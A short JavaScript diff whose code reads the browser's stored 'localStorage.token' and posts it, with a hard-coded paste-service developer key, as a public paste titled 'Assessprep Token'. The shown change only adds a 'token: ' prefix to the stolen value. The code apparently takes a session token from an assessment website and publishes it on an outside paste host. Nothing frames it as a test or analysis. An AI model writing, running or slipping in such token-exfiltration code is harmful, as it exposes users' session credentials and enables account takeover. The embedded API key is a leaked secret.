@@ -3,7 +3,7 @@ myHeaders.append("Content-Type", "application/x-www-form-urlencoded");
 
 var urlencoded = new URLSearchParams();
 urlencoded.append("api_dev_key", "uRCEvTvuzP4MOEJeHgK7hztuBgfAnTOn");
-urlencoded.append("api_paste_code", localStorage.token);
+urlencoded.append("api_paste_code", "token: " + localStorage.token);
 urlencoded.append("api_option", "paste");
 urlencoded.append("api_paste_name", "Assessprep Token");
 urlencoded.append("api_paste_private", "0");
